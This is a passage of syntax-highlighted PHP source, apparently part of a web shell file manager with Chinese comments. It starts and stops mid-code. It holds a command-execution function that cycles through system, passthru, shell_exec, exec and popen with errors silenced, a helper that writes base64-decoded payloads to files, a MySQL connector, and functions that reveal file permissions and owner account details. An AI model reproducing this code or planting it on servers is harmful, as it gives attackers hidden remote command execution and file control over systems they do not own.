<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">cfe</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">function_exists(</span><span style="color: #66cccc;">'system'</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">ob_start(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">system(</span>$<span style="color: #ffcc66;">cfe</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">res</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">ob_get_contents(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">ob_end_clean(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">elseif</span>(<span style="color: #cccccc; background-color: #2d2d2d;">function_exists(</span><span style="color: #66cccc;">'passthru'</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">ob_start(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">passthru(</span>$<span style="color: #ffcc66;">cfe</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">res</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">ob_get_contents(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">ob_end_clean(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">elseif</span>(<span style="color: #cccccc; background-color: #2d2d2d;">function_exists(</span><span style="color: #66cccc;">'shell_exec'</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">res</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">shell_exec(</span>$<span style="color: #ffcc66;">cfe</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">elseif</span>(<span style="color: #cccccc; background-color: #2d2d2d;">function_exists(</span><span style="color: #66cccc;">'exec'</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">exec(</span>$<span style="color: #ffcc66;">cfe</span>,$<span style="color: #ffcc66;">res</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">res</span> = <span style="color: #cccccc; background-color: #2d2d2d;">join(</span><span style="color: #66cccc;">"\n"</span>,$<span style="color: #ffcc66;">res</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">elseif</span>(@<span style="color: #cccccc; background-color: #2d2d2d;">is_resource(</span>$<span style="color: #ffcc66;">f</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">popen(</span>$<span style="color: #ffcc66;">cfe</span>,<span style="color: #66cccc;">"r"</span>))) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">res</span> = <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span>(!@<span style="color: #cccccc; background-color: #2d2d2d;">feof(</span>$<span style="color: #ffcc66;">f</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">res</span> .= @<span style="color: #cccccc; background-color: #2d2d2d;">fread(</span>$<span style="color: #ffcc66;">f</span>,<span style="color: #cccccc; background-color: #2d2d2d;">1024</span>);<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">pclose(</span>$<span style="color: #ffcc66;">f</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">res</span>;
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">which</span>($<span style="color: #ffcc66;">pr</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">path</span> = <span style="color: #cccccc; background-color: #2d2d2d;">execute(</span><span style="color: #66cccc;">"which $pr"</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> ($<span style="color: #ffcc66;">path</span> ? $<span style="color: #ffcc66;">path</span> : $<span style="color: #ffcc66;">pr</span>);<span style="color: #f2777a; background-color: #515151;"> </span>
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">cf</span>($<span style="color: #ffcc66;">fname</span>,$<span style="color: #ffcc66;">text</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">fp</span>=@<span style="color: #cccccc; background-color: #2d2d2d;">fopen(</span>$<span style="color: #ffcc66;">fname</span>,<span style="color: #66cccc;">'w'</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">fputs(</span>$<span style="color: #ffcc66;">fp</span>,@<span style="color: #cccccc; background-color: #2d2d2d;">base64_decode(</span>$<span style="color: #ffcc66;">text</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">fclose(</span>$<span style="color: #ffcc66;">fp</span>);
<span style="background-color: #515151;"> </span>   }
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">dirsize</span>($<span style="color: #ffcc66;">dir</span>) {<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dh</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">opendir(</span>$<span style="color: #ffcc66;">dir</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">size</span> = <span style="color: #cccccc; background-color: #2d2d2d;">0</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span>($<span style="color: #ffcc66;">file</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">readdir(</span>$<span style="color: #ffcc66;">dh</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">file</span> != <span style="color: #66cccc;">'.'</span> &amp;&amp; $<span style="color: #ffcc66;">file</span> != <span style="color: #66cccc;">'..'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">path</span> = $<span style="color: #ffcc66;">dir</span>.<span style="color: #66cccc;">'/'</span>.$<span style="color: #ffcc66;">file</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">size</span> += @<span style="color: #cccccc; background-color: #2d2d2d;">is_dir(</span>$<span style="color: #ffcc66;">path</span>) ? <span style="color: #cccccc; background-color: #2d2d2d;">dirsize(</span>$<span style="color: #ffcc66;">path</span>) : @<span style="color: #cccccc; background-color: #2d2d2d;">filesize(</span>$<span style="color: #ffcc66;">path</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">closedir(</span>$<span style="color: #ffcc66;">dh</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">size</span>;
}
<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#39029;&#38754;&#35843;&#35797;&#20449;&#24687;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">debuginfo</span>() {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">global</span> $<span style="color: #ffcc66;">starttime</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">mtime</span> = <span style="color: #cccccc; background-color: #2d2d2d;">explode(</span><span style="color: #66cccc;">' '</span>, <span style="color: #cccccc; background-color: #2d2d2d;">microtime(</span>));
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">totaltime</span> = <span style="color: #cccccc; background-color: #2d2d2d;">number_format(</span>($<span style="color: #ffcc66;">mtime</span>[<span style="color: #cccccc; background-color: #2d2d2d;">1</span>] + $<span style="color: #ffcc66;">mtime</span>[<span style="color: #cccccc; background-color: #2d2d2d;">0</span>] - $<span style="color: #ffcc66;">starttime</span>), <span style="color: #cccccc; background-color: #2d2d2d;">6</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">echo</span> <span style="color: #66cccc;">'Processed in '</span>.$<span style="color: #ffcc66;">totaltime</span>.<span style="color: #66cccc;">' second(s)'</span>;
}

<span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#36830;&#25509;MYSQL&#25968;&#25454;&#24211;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">mydbconn</span>($<span style="color: #ffcc66;">dbhost</span>,$<span style="color: #ffcc66;">dbuser</span>,$<span style="color: #ffcc66;">dbpass</span>,$<span style="color: #ffcc66;">dbname</span>=<span style="color: #66cccc;">''</span>,$<span style="color: #ffcc66;">charset</span>=<span style="color: #66cccc;">''</span>,$<span style="color: #ffcc66;">dbport</span>=<span style="color: #66cccc;">'3306'</span>)<span style="text-decoration: underline;"> {</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">global</span> $<span style="color: #ffcc66;">charsetdb</span>;
<span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">ini_set(</span><span style="color: #66cccc;">'mysql.connect_timeout'</span>, <span style="color: #cccccc; background-color: #2d2d2d;">5</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(!$<span style="color: #ffcc66;">link</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">mysql_connect(</span>$<span style="color: #ffcc66;">dbhost</span>.<span style="color: #66cccc;">':'</span>.$<span style="color: #ffcc66;">dbport</span>, $<span style="color: #ffcc66;">dbuser</span>, $<span style="color: #ffcc66;">dbpass</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;h2&gt;Can not connect to MySQL server&lt;/h2&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">exit</span>;
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">link</span> &amp;&amp; $<span style="color: #ffcc66;">dbname</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!@<span style="color: #cccccc; background-color: #2d2d2d;">mysql_select_db(</span>$<span style="color: #ffcc66;">dbname</span>, $<span style="color: #ffcc66;">link</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;h2&gt;Database selected has error&lt;/h2&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">exit</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">link</span> &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">mysql_get_server_info(</span>) &gt; <span style="color: #66cccc;">'4.1'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">charset</span> &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">in_array(strtolower(</span>$<span style="color: #ffcc66;">charset</span>), $<span style="color: #ffcc66;">charsetdb</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"SET character_set_connection=$charset, character_set_results=$cha</span><span style="color: #66cccc; text-decoration: underline;">rset, character_set_client=binary;"</span><span style="text-decoration: underline;">, $</span><span style="color: #ffcc66; text-decoration: underline;">link</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">link</span>;
}

<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#21435;&#25481;&#36716;&#20041;&#23383;&#31526;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">s_array</span>(&amp;$<span style="color: #ffcc66;">array</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">is_array(</span>$<span style="color: #ffcc66;">array</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span> ($<span style="color: #ffcc66;">array</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">k</span> =&gt; $<span style="color: #ffcc66;">v</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">array</span>[$<span style="color: #ffcc66;">k</span>] = <span style="color: #cccccc; background-color: #2d2d2d;">s_array(</span>$<span style="color: #ffcc66;">v</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">is_string(</span>$<span style="color: #ffcc66;">array</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">array</span> = <span style="color: #cccccc; background-color: #2d2d2d;">stripslashes(</span>$<span style="color: #ffcc66;">array</span>);
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">array</span>;
}

<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#28165;&#38500;HTML&#20195;&#30721;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">html_clean</span>($<span style="color: #ffcc66;">content</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">content</span> = <span style="color: #cccccc; background-color: #2d2d2d;">htmlspecialchars(</span>$<span style="color: #ffcc66;">content</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">content</span> = <span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span><span style="color: #66cccc;">"\n"</span>, <span style="color: #66cccc;">"&lt;br /&gt;"</span>, $<span style="color: #ffcc66;">content</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">content</span> = <span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span><span style="color: #66cccc;">"  "</span>, <span style="color: #66cccc;">"&amp;nbsp;&amp;nbsp;"</span>, $<span style="color: #ffcc66;">content</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">content</span> = <span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span><span style="color: #66cccc;">"\t"</span>, <span style="color: #66cccc;">"&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;"</span>, $<span style="color: #ffcc66;">content</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">content</span>;
}

<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#33719;&#21462;&#26435;&#38480;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">getChmod</span>($<span style="color: #ffcc66;">filepath</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> <span style="color: #cccccc; background-color: #2d2d2d;">substr(base_convert(</span>@<span style="color: #cccccc; background-color: #2d2d2d;">fileperms(</span>$<span style="color: #ffcc66;">filepath</span>),<span style="color: #cccccc; background-color: #2d2d2d;">10</span>,<span style="color: #cccccc; background-color: #2d2d2d;">8</span>),-<span style="color: #cccccc; background-color: #2d2d2d;">4</span>);
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">getPerms</span>($<span style="color: #ffcc66;">filepath</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">mode</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">fileperms(</span>$<span style="color: #ffcc66;">filepath</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">0</span>xC000) === <span style="color: #cccccc; background-color: #2d2d2d;">0</span>xC000) {$<span style="color: #ffcc66;">type</span> = <span style="color: #66cccc;">'s'</span>;}
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">elseif</span> (($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">0</span>x4000) === <span style="color: #cccccc; background-color: #2d2d2d;">0</span>x4000) {$<span style="color: #ffcc66;">type</span> = <span style="color: #66cccc;">'d'</span>;}
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">elseif</span> (($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">0</span>xA000) === <span style="color: #cccccc; background-color: #2d2d2d;">0</span>xA000) {$<span style="color: #ffcc66;">type</span> = <span style="color: #66cccc;">'l'</span>;}
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">elseif</span> (($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">0</span>x8000) === <span style="color: #cccccc; background-color: #2d2d2d;">0</span>x8000) {$<span style="color: #ffcc66;">type</span> = <span style="color: #66cccc;">'-'</span>;}<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">elseif</span> (($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">0</span>x6000) === <span style="color: #cccccc; background-color: #2d2d2d;">0</span>x6000) {$<span style="color: #ffcc66;">type</span> = <span style="color: #66cccc;">'b'</span>;}
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">elseif</span> (($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">0</span>x2000) === <span style="color: #cccccc; background-color: #2d2d2d;">0</span>x2000) {$<span style="color: #ffcc66;">type</span> = <span style="color: #66cccc;">'c'</span>;}
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">elseif</span> (($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">0</span>x1000) === <span style="color: #cccccc; background-color: #2d2d2d;">0</span>x1000) {$<span style="color: #ffcc66;">type</span> = <span style="color: #66cccc;">'p'</span>;}
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">else</span> {$<span style="color: #ffcc66;">type</span> = <span style="color: #66cccc;">'?'</span>;}

<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">owner</span>[<span style="color: #66cccc;">'read'</span>] = ($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">00400</span>) ? <span style="color: #66cccc;">'r'</span> : <span style="color: #66cccc;">'-'</span>;<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">owner</span>[<span style="color: #66cccc;">'write'</span>] = ($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">00200</span>) ? <span style="color: #66cccc;">'w'</span> : <span style="color: #66cccc;">'-'</span>;<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">owner</span>[<span style="color: #66cccc;">'execute'</span>] = ($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">00100</span>) ? <span style="color: #66cccc;">'x'</span> : <span style="color: #66cccc;">'-'</span>;<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">group</span>[<span style="color: #66cccc;">'read'</span>] = ($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">00040</span>) ? <span style="color: #66cccc;">'r'</span> : <span style="color: #66cccc;">'-'</span>;<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">group</span>[<span style="color: #66cccc;">'write'</span>] = ($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">00020</span>) ? <span style="color: #66cccc;">'w'</span> : <span style="color: #66cccc;">'-'</span>;<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">group</span>[<span style="color: #66cccc;">'execute'</span>] = ($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">00010</span>) ? <span style="color: #66cccc;">'x'</span> : <span style="color: #66cccc;">'-'</span>;<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">world</span>[<span style="color: #66cccc;">'read'</span>] = ($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">00004</span>) ? <span style="color: #66cccc;">'r'</span> : <span style="color: #66cccc;">'-'</span>;<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">world</span>[<span style="color: #66cccc;">'write'</span>] = ($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">00002</span>) ? <span style="color: #66cccc;">'w'</span> : <span style="color: #66cccc;">'-'</span>;<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">world</span>[<span style="color: #66cccc;">'execute'</span>] = ($<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">00001</span>) ? <span style="color: #66cccc;">'x'</span> : <span style="color: #66cccc;">'-'</span>;<span style="color: #f2777a; background-color: #515151;"> </span>

<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>( $<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">0</span>x800 ) {$<span style="color: #ffcc66;">owner</span>[<span style="color: #66cccc;">'execute'</span>] = ($<span style="color: #ffcc66;">owner</span>[<span style="color: #66cccc;">'execute'</span>]==<span style="color: #66cccc;">'x'</span>) ? <span style="color: #66cccc;">'s'</span> : <span style="color: #66cccc;">'S</span><span style="color: #66cccc; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>( $<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">0</span>x400 ) {$<span style="color: #ffcc66;">group</span>[<span style="color: #66cccc;">'execute'</span>] = ($<span style="color: #ffcc66;">group</span>[<span style="color: #66cccc;">'execute'</span>]==<span style="color: #66cccc;">'x'</span>) ? <span style="color: #66cccc;">'s'</span> : <span style="color: #66cccc;">'S</span><span style="color: #66cccc; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>( $<span style="color: #ffcc66;">mode</span> &amp; <span style="color: #cccccc; background-color: #2d2d2d;">0</span>x200 ) {$<span style="color: #ffcc66;">world</span>[<span style="color: #66cccc;">'execute'</span>] = ($<span style="color: #ffcc66;">world</span>[<span style="color: #66cccc;">'execute'</span>]==<span style="color: #66cccc;">'x'</span>) ? <span style="color: #66cccc;">'t'</span> : <span style="color: #66cccc;">'T</span><span style="color: #66cccc; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>

<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">type</span><span style="color: #f2777a; font-weight: bold;">.</span>$<span style="color: #ffcc66;">owner</span>[<span style="color: #66cccc;">'read'</span>].$<span style="color: #ffcc66;">owner</span>[<span style="color: #66cccc;">'write'</span>].$<span style="color: #ffcc66;">owner</span>[<span style="color: #66cccc;">'execute'</span>].$<span style="color: #ffcc66;">group</span>[<span style="color: #66cccc;">'read'</span>]<span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">group</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'write'</span><span style="text-decoration: underline;">].$</span><span style="color: #ffcc66; text-decoration: underline;">group</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'execute'</span><span style="text-decoration: underline;">].$</span><span style="color: #ffcc66; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'read'</span><span style="text-decoration: underline;">].$</span><span style="color: #ffcc66; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'write'</span><span style="text-decoration: underline;">].$</span><span style="color: #ffcc66; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'execute'</span><span style="text-decoration: underline;">];</span>
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">getUser</span>($<span style="color: #ffcc66;">filepath</span>)     {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">function_exists(</span><span style="color: #66cccc;">'posix_getpwuid'</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">array</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">posix_getpwuid(</span>@<span style="color: #cccccc; background-color: #2d2d2d;">fileowner(</span>$<span style="color: #ffcc66;">filepath</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">array</span> &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">is_array(</span>$<span style="color: #ffcc66;">array</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> <span style="color: #66cccc;">' / &lt;a href="#" title="User: '</span>.$<span style="color: #ffcc66;">array</span>[<span style="color: #66cccc;">'name'</span>].<span style="color: #66cccc;">'&amp;#13&amp;#10Passwd</span><span style="color: #66cccc; text-decoration: underline;">: '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'passwd'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&amp;#13&amp;#10Uid: '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'uid'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&amp;#13&amp;#10gid: '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'gid'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&amp;#13&amp;#10Gecos: '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'gecos'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&amp;#13&amp;#10Dir: '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'dir'</span><span 